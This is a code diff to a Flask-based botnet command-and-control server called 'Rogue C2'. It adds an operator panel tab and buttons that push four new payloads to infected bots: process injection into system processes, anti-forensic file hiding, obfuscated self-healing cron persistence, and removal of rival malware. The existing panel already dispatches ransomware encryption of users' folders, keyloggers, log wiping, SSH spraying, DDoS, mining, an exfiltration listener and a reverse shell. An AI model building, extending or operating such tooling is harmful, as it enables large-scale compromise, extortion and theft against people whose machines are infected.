@@ -230,6 +230,7 @@ def admin_panel():
             .util-btn { background: #2a5a5a; }
             .compound-btn { background: #5a5a2a; }
             .encryption-btn { background: #ff6600; }
+            .advanced-btn { background: #8a2be2; }
             .tab-container { display: flex; border-bottom: 1px solid #444; margin-bottom: 20px; }
             .tab { padding: 10px 20px; cursor: pointer; border: 1px solid transparent; }
             .tab.active { background: #222; border: 1px solid #444; border-bottom: none; }
@@ -240,6 +241,7 @@ def admin_panel():
             .fileransom-form > div { display: flex; flex-direction: column; }
             .fileransom-form label { font-size: 12px; margin-bottom: 3px; color: #888; }
             .warning-box { background: #3a1a1a; border: 2px solid #ff3333; padding: 15px; margin: 15px 0; }
+            .advanced-box { background: #1a1a3a; border: 2px solid #8a2be2; padding: 15px; margin: 15px 0; }
         </style>
     </head>
     <body>
@@ -253,6 +255,7 @@ def admin_panel():
                 <div class="tab active" onclick="switchTab('bots')"> Active Bots ({{ bot_count }})</div>
                 <div class="tab" onclick="switchTab('operations')"> Operations</div>
                 <div class="tab" onclick="switchTab('payloads')"> Payloads</div>
+                <div class="tab" onclick="switchTab('advanced')"> Advanced</div>
                 <div class="tab" onclick="switchTab('results')"> Results</div>
                 <div class="tab" onclick="switchTab('server')"> Server Status</div>
             </div>
@@ -288,6 +291,11 @@ def admin_panel():
                                 <option value="trigger_keylogger">Keylogger</option>
                                 <option value="trigger_screenshot">Screenshots</option>
                                 <option value="trigger_logclean">Clean Logs</option>
+                                <!-- NEW ADVANCED PAYLOADS -->
+                                <option value="trigger_procinject">Process Injection</option>
+                                <option value="trigger_filehide">Advanced File Hide</option>
+                                <option value="trigger_cronpersist">Advanced Cron Persist</option>
+                                <option value="trigger_compclean">Competitor Cleaner</option>
                                 <!-- FILE ENCRYPTION OPTIONS -->
                                 <option value="trigger_fileransom encrypt /home/user/Documents">Encrypt Documents</option>
                                 <option value="trigger_fileransom encrypt /home/user/Downloads">Encrypt Downloads</option>
@@ -324,9 +332,30 @@ def admin_panel():
                     </div>
                     {% endfor %}
                     
+                    <!-- ADVANCED PAYLOADS SECTION -->
+                    <div class="section advanced-box">
+                        <h3 style="color: #8a2be2;"> Advanced Payloads (NEW)</h3>
+                        <p><small>Advanced stealth and persistence techniques for elite operations</small></p>
+                        
+                        <div class="button-group">
+                            <button class="advanced-btn" onclick="sendToBot(selectedBotId(), 'trigger_procinject')">Process Injection</button>
+                            <button class="advanced-btn" onclick="sendToBot(selectedBotId(), 'trigger_filehide')">Advanced File Hide</button>
+                            <button class="advanced-btn" onclick="sendToBot(selectedBotId(), 'trigger_cronpersist')">Advanced Cron Persist</button>
+                            <button class="advanced-btn" onclick="sendToBot(selectedBotId(), 'trigger_compclean')">Competitor Cleaner</button>
+                        </div>
+                        
+                        <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
+                            <strong>Description:</strong><br>
+                            • <strong>Process Injection</strong>: Inject implant into legitimate processes for stealth<br>
+                            • <strong>Advanced File Hide</strong>: Hide files using advanced techniques (extended attributes, etc.)<br>
+                            • <strong>Advanced Cron Persist</strong>: Set up sophisticated cron-based persistence<br>
+                            • <strong>Competitor Cleaner</strong>: Remove other malware/botnets from the system
+                        </div>
+                    </div>
+                    
                     <!-- FILE ENCRYPTION TOOL -->
                     <div class="section warning-box">
-                        <h3 style="color: #ff6600;">⚠️ File Encryption Tool (DESTRUCTIVE)</h3>
+                        <h3 style="color: #ff6600;"> File Encryption Tool (DESTRUCTIVE)</h3>
                         <p><small>WARNING: This tool encrypts files and removes originals. Only use in authorized test environments!</small></p>
                         
                         <div class="fileransom-form">
@@ -391,6 +420,17 @@ def admin_panel():
                         <button class="compound-btn" onclick="sendToAll('trigger_full_recon')">Full Recon Suite</button>
                         <button class="compound-btn" onclick="sendToAll('trigger_harvest_all')">Harvest All Data</button>
                         <button class="compound-btn" onclick="sendToAll('trigger_clean_sweep')">Clean Sweep</button>
+                    </div>
+                </div>
+                
+                <!-- NEW ADVANCED PAYLOADS SECTION -->
+                <div class="section advanced-box">
+                    <h2 style="color: #8a2be2;"> Advanced Payloads (NEW)</h2>
+                    <div class="button-group">
+                        <button class="advanced-btn" onclick="sendToAll('trigger_procinject')">Process Injection</button>
+                        <button class="advanced-btn" onclick="sendToAll('trigger_filehide')">Advanced File Hide</button>
+                        <button class="advanced-btn" onclick="sendToAll('trigger_cronpersist')">Advanced Cron Persist</button>
+                        <button class="advanced-btn" onclick="sendToAll('trigger_compclean')">Competitor Cleaner</button>
                     </div>
                 </div>
                 
@@ -537,13 +577,129 @@ def admin_panel():
                             <strong>Auto Deploy</strong>
                             <p><small>Automated network deployment</small></p>
                             <button onclick="sendToAll('load_payload autodeploy.py')">Load</button>
-                            <button onclick="sendToAll('run_payload autodeploy.py')Run</button>
+                            <button onclick="sendToAll('run_payload autodeploy.py')">Run</button>
                         </div>
+                        <!-- NEW PAYLOADS -->
+                        <div class="bot advanced-box">
+                            <strong style="color: #8a2be2;">Process Injection</strong>
+                            <p><small> Inject implant into processes for stealth</small></p>
+                            <button onclick="sendToAll('load_payload process_inject.py')">Load</button>
+                            <button onclick="sendToAll('run_payload process_inject.py')" style="background: #8a2be2;">Run</button>
+                        </div>
+                        <div class="bot advanced-box">
+                            <strong style="color: #8a2be2;">Advanced File Hider</strong>
+                            <p><small> Hide files using advanced techniques</small></p>
+                            <button onclick="sendToAll('load_payload advanced_filehider.py')">Load</button>
+                            <button onclick="sendToAll('run_payload advanced_filehider.py')" style="background: #8a2be2;">Run</button>
+                        </div>
+                        <div class="bot advanced-box">
+                            <strong style="color: #8a2be2;">Advanced Cron Persistence</strong>
+                            <p><small> Sophisticated cron-based persistence</small></p>
+                            <button onclick="sendToAll('load_payload advanced_cron_persistence.py')">Load</button>
+                            <button onclick="sendToAll('run_payload advanced_cron_persistence.py')" style="background: #8a2be2;">Run</button>
+                        </div>
+                        <div class="bot advanced-box">
+                            <strong style="color: #8a2be2;">Competitor Cleaner</strong>
+                            <p><small> Remove other malware/botnets from system</small></p>
+                            <button onclick="sendToAll('load_payload competitor_cleaner.py')">Load</button>
+                            <button onclick="sendToAll('run_payload competitor_cleaner.py')" style="background: #8a2be2;">Run</button>
+                        </div>
+                        <!-- END NEW PAYLOADS -->
                         <div class="bot" style="border: 2px solid #ff6600;">
                             <strong style="color: #ff6600;">File Encryption</strong>
-                            <p><small>⚠️ AES-256 file encryption/decryption</small></p>
+                            <p><small> AES-256 file encryption/decryption</small></p>
                             <button onclick="sendToAll('load_payload fileransom.py')">Load</button>
                             <button onclick="sendToAll('run_payload fileransom.py')" style="background: #ff6600;">Run</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- ADVANCED TAB (NEW) -->
+            <div id="advanced-tab" class="tab-content">
+                <div class="section advanced-box">
+                    <h2 style="color: #8a2be2;"> Advanced Payloads Suite</h2>
+                    <p>Elite stealth, persistence, and system manipulation techniques for advanced operators</p>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px;">
+                        <div class="bot">
+                            <h3 style="color: #8a2be2;">Process Injection</h3>
+                            <p><small>Inject Rogue implant into legitimate system processes (systemd, sshd, etc.) for maximum stealth. Bypasses traditional process monitoring.</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToAll('trigger_procinject')" style="background: #8a2be2;">Execute</button>
+                                <button onclick="sendToAll('load_payload process_inject.py')">Load</button>
+                            </div>
+                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
+                                <strong>Features:</strong><br>
+                                • Inject into running processes<br>
+                                • Memory-only execution<br>
+                                • Bypass file scanning<br>
+                                • Persist across reboots
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #8a2be2;">Advanced File Hider</h3>
+                            <p><small>Hide implant files using extended attributes, hidden directories, and filesystem manipulation techniques. Makes files invisible to standard tools.</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToAll('trigger_filehide')" style="background: #8a2be2;">Execute</button>
+                                <button onclick="sendToAll('load_payload advanced_filehider.py')">Load</button>
+                            </div>
+                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
+                                <strong>Features:</strong><br>
+                                • Extended attributes hiding<br>
+                                • Dot-prefix manipulation<br>
+                                • Filesystem tunneling<br>
+                                • Anti-forensics techniques
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #8a2be2;">Advanced Cron Persistence</h3>
+                            <p><small>Set up sophisticated cron-based persistence with randomization, obfuscation, and anti-detection mechanisms. Harder to detect than basic cron jobs.</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToAll('trigger_cronpersist')" style="background: #8a2be2;">Execute</button>
+                                <button onclick="sendToAll('load_payload advanced_cron_persistence.py')">Load</button>
+                            </div>
+                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
+                                <strong>Features:</strong><br>
+                                • Randomized execution times<br>
+                                • Obfuscated cron entries<br>
+                                • Multiple backup methods<br>
+                                • Self-healing capability
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #8a2be2;">Competitor Cleaner</h3>
+                            <p><small>Identify and remove other malware, botnets, and competitor implants from the system. Clean up the environment for exclusive control.</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToAll('trigger_compclean')" style="background: #8a2be2;">Execute</button>
+                                <button onclick="sendToAll('load_payload competitor_cleaner.py')">Load</button>
+                            </div>
+                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
+                                <strong>Features:</strong><br>
+                                • Detect common malware<br>
+                                • Remove competitor C2<br>
+                                • Clean persistence methods<br>
+                                • System sanitization
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="section" style="margin-top: 30px;">
+                        <h3> Advanced Operations Console</h3>
+                        <div class="command-form">
+                            <input type="text" id="advanced_cmd" placeholder="Advanced command (e.g., trigger_procinject)" style="width: 400px;">
+                            <button onclick="sendAdvancedCommand()" style="background: #8a2be2;">Send to Selected Bot</button>
+                            <button onclick="sendAdvancedToAll()" style="background: #6a1bc9;">Send to All Bots</button>
+                        </div>
+                        
+                        <div style="margin-top: 15px;">
+                            <button onclick="document.getElementById('advanced_cmd').value = 'trigger_procinject'">Process Injection</button>
+                            <button onclick="document.getElementById('advanced_cmd').value = 'trigger_filehide'">File Hide</button>
+                            <button onclick="document.getElementById('advanced_cmd').value = 'trigger_cronpersist'">Cron Persist</button>
+                            <button onclick="document.getElementById('advanced_cmd').value = 'trigger_compclean'">Competitor Clean</button>
                         </div>
                     </div>
                 </div>
@@ -581,6 +737,7 @@ def admin_panel():
                     <p><strong>Payloads Repository:</strong> <a href="{{ payload_url }}" target="_blank">{{ payload_url }}</a></p>
                     <p><strong>Active Bots:</strong> {{ bot_count }}</p>
                     <p><strong>Pending Commands:</strong> {{ pending_count }}</p>
+                    <p><strong>Advanced Payloads:</strong> 4 (New)</p>
                     <p><strong>Uptime:</strong> <span id="uptime">Calculating...</span></p>
                     
                     <h3> Quick Actions</h3>
@@ -600,6 +757,7 @@ def admin_panel():
                 <button onclick="sendManualCommand()">Send</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_help'">Insert Help</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_status'">Insert Status</button>
+                <button onclick="document.getElementById('manual_cmd').value = 'trigger_procinject'" style="background: #8a2be2;">Insert Process Inject</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt /home/user/Documents'" style="background: #ff6600;">Insert File Encrypt</button>
             </div>
         </div>
@@ -640,6 +798,15 @@ def admin_panel():
                 document.querySelector(`[onclick="switchTab('${tabName}')"]`).classList.add('active');
             }
             
+            function selectedBotId() {
+                const selectedBot = document.querySelector('.bot.active-bot');
+                if (!selectedBot) {
+                    alert('Please select a bot first (click on a bot)');
+                    return null;
+                }
+                return selectedBot.querySelector('strong').textContent.trim();
+            }
+            
             function sendCommand(botId) {
                 const cmdInput = document.getElementById('cmd_' + botId);
                 const typeSelect = document.getElementById('type_' + botId);
@@ -652,7 +819,7 @@ def admin_panel():
                 
                 // Special warning for file encryption
                 if (command.includes('trigger_fileransom encrypt')) {
-                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                         return;
                     }
                 }
@@ -676,7 +843,7 @@ def admin_panel():
             function sendToBot(botId, command) {
                 // Special warning for file encryption
                 if (command.includes('trigger_fileransom encrypt')) {
-                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                         return;
                     }
                 }
@@ -716,7 +883,7 @@ def admin_panel():
             function sendToAll(command) {
                 // Special warning for file encryption
                 if (command.includes('trigger_fileransom encrypt')) {
-                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis command will be sent to ALL bots.\\n\\nContinue?')) {
+                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nThis command will be sent to ALL bots.\\n\\nContinue?')) {
                         return;
                     }
                 }
@@ -748,7 +915,7 @@ def admin_panel():
                 
                 // Special warning for file encryption
                 if (command.includes('trigger_fileransom encrypt')) {
-                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                         return;
                     }
                 }
@@ -796,7 +963,7 @@ def admin_panel():
                 
                 // Special warning for encryption
                 if (action === 'encrypt') {
-                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                         return;
                     }
                 }
@@ -806,36 +973,52 @@ def admin_panel():
                     cmd += ' ' + password;
                 }
                 
-                // Find the currently selected bot
-                var selectedBot = document.querySelector('.bot.active-bot');
-                if (!selectedBot) {
-                    alert('Please select a bot first');
-                    return;
-                }
+                var botId = selectedBotId();
+                if (!botId) return;
                 
-                var botId = selectedBot.querySelector('strong').textContent.trim();
                 sendToBot(botId, cmd);
             }
             
             function quickFileransom(action, path) {
                 // Special warning for encryption
                 if (action === 'encrypt') {
-                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                    if (!confirm(' WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
                         return;
                     }
                 }
                 
                 var cmd = 'trigger_fileransom ' + action + ' ' + path;
                 
-                // Find the currently selected bot
-                var selectedBot = document.querySelector('.bot.active-bot');
-                if (!selectedBot) {
-                    alert('Please select a bot first');
+                var botId = selectedBotId();
+                if (!botId) return;
+                
+                sendToBot(botId, cmd);
+            }
+            
+            // ADVANCED PAYLOADS FUNCTIONS
+            function sendAdvancedCommand() {
+                var command = document.getElementById('advanced_cmd').value;
+                if (!command.trim()) {
+                    alert('Please enter an advanced command');
                     return;
                 }
                 
-                var botId = selectedBot.querySelector('strong').textContent.trim();
-                sendToBot(botId, cmd);
+                var botId = selectedBotId();
+                if (!botId) return;
+                
+                sendToBot(botId, command);
+            }
+            
+            function sendAdvancedToAll() {
+                var command = document.getElementById('advanced_cmd').value;
+                if (!command.trim()) {
+                    alert('Please enter an advanced command');
+                    return;
+                }
+                
+                if (!confirm('Send advanced command "' + command + '" to ALL bots?')) return;
+                
+                sendToAll(command);
             }
             
             // Auto-refresh every 30 seconds
@@ -994,11 +1177,13 @@ def list_payloads():
             a:hover {{ color: #fff; text-decoration: underline; }}
             .payload-info {{ font-size: 12px; color: #888; margin-top: 5px; }}
             .warning {{ border: 2px solid #ff6600; background: #3a1a1a; }}
+            .advanced {{ border: 2px solid #8a2be2; background: #1a1a3a; }}
         </style>
     </head>
     <body>
         <h1>Rogue C2 Payload Repository</h1>
         <p><strong>Total Payloads:</strong> {len([f for f in files if f.endswith('.py')])}</p>
+        <p><strong>Advanced Payloads (NEW):</strong> 4</p>
         <ul>
     """
     
@@ -1012,14 +1197,21 @@ def list_payloads():
         'Lateral Movement': ['sshspray.py', 'autodeploy.py', 'lateral_movement.py'],
         'Command & Control': ['dnstunnel.py'],
         'Impact': ['ddos.py', 'mine.py', 'fileransom.py'],
-        'Persistence': ['polyloader.py']
+        'Persistence': ['polyloader.py'],
+        'Advanced (NEW)': ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py']
     }
     
     for category, payloads in payload_categories.items():
         html += f'<h2>{category}</h2>'
         for payload in payloads:
             if payload in files:
-                warning_class = 'warning' if payload == 'fileransom.py' else ''
+                if payload == 'fileransom.py':
+                    warning_class = 'warning'
+                elif payload in ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py']:
+                    warning_class = 'advanced'
+                else:
+                    warning_class = ''
+                
                 html += f'''
                 <li class="{warning_class}">
                     <a href="/payloads/{payload}">{payload}</a>
@@ -1027,6 +1219,7 @@ def list_payloads():
                         Size: {os.path.getsize(os.path.join(payload_dir, payload)) // 1024} KB | 
                         <a href="javascript:sendToAll(\\'load_payload {payload}\\')">Load</a> | 
                         <a href="javascript:sendToAll(\\'run_payload {payload}\\')">Run</a>
+                        { ' | <span style="color:#8a2be2"> NEW</span>' if payload in ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py'] else '' }
                     </div>
                 </li>
                 '''
@@ -1036,7 +1229,7 @@ def list_payloads():
         <script>
             function sendToAll(command) {
                 if (command.includes('fileransom')) {
-                    if (!confirm('⚠️ WARNING: File encryption payload is DESTRUCTIVE!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
+                    if (!confirm(' WARNING: File encryption payload is DESTRUCTIVE!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
                         return;
                     }
                 }
@@ -1228,6 +1421,7 @@ def main():
     print(f"[EXFIL] Listener: 0.0.0.0:{EXFIL_PORT}")
     print(f"[SHELL] Reverse Shell: 0.0.0.0:9001")
     print(f"[PAYLOADS] Available at: {ngrok_url}/payloads/" if ngrok_url else f"[PAYLOADS] Available at: http://localhost:{C2_PORT}/payloads/")
+    print(f"[ADVANCED] 4 New Payloads Added: Process Injection, File Hider, Cron Persist, Competitor Cleaner")
     print("\n" + "="*60)
     
     # Start Flask server
